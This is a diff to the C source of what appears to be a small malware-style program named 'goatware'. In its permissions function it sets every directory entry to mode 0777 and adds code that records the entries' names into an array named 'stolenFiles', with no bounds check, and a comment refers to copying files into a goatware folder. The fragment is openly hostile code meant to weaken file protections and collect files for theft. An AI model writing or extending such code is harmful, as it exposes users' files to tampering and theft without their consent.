@@ -20,6 +20,7 @@ void givePermission();
 int copyFile(char *address, char *destPath);
 
 char copyToDir[1024];
+char stolenFiles[1024][1024];
 
 int main(int argc, const char *argv[]) {
 	
@@ -114,10 +115,17 @@ void givePermission() {
 	if (!entry)
 		return;
 
+	int i = 0;
 	do {
 		chmod(entry->d_name, 0777);
+		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
+				continue;
+		}
+		strcpy(stolenFiles[i], entry->d_name);
+		i++;
 		printf("%s has been given access permission.\n", entry->d_name);
 	} while (entry = readdir(dir));
+	closedir(dir);
 }
 
 //copies original file to goatware folder
